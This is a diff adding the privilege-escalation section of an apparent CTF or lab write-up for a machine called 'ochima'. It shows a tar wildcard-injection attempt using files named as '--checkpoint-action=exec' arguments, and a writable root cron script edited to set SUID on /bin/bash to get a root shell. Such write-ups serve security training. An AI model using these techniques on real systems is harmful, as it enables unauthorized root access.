@@ -95,4 +95,42 @@ run the exploit and we got a reverse shell.
 
 ## Privilege Escalation
 
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/754bcba6-8dd0-4215-a1fa-6606f64a2286)
 
+running pspy, we can see a cron job by root. Running tar. let's abuse it and also a cronjob for `/var/backups/etc_Backup.sh`
+
+```shell
+snort@ochima:/tmp$ cd /home/snort/
+snort@ochima:~$ echo "" > '--checkpoint=1'
+snort@ochima:~$ echo "" > '--checkpoint-action=exec=sh privesc.sh'
+snort@ochima:~$ nano privesc.sh
+snort@ochima:~$ cat privesc.sh 
+#!/bin/bash
+
+chmod +s /bin/bash
+snort@ochima:~$ ls -al /bin/bash
+-rwxr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
+snort@ochima:~$ 
+```
+the above did not work, let's check out the `/var/backups/etc_Backup.sh`.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/edc2368b-2db5-41f6-98f1-050a3031cd7b)
+
+we have full permission to the file. let's modify it 
+
+```shell
+snort@ochima:/var/backups$ cat /var/backups/etc_Backup.sh
+#! /bin/bash 
+tar -cf /home/snort/etc_backup.tar /etc
+chmod +s /bin/bash
+snort@ochima:/var/backups$ 
+```
+create an suid for `/bin/bash`.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c4e4459a-7152-439f-b736-3fcc9b402ac8)
+
+abuse the suid and boom w got root.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/07a103ef-957b-422f-9523-25c879068be1)
+
+and we are through
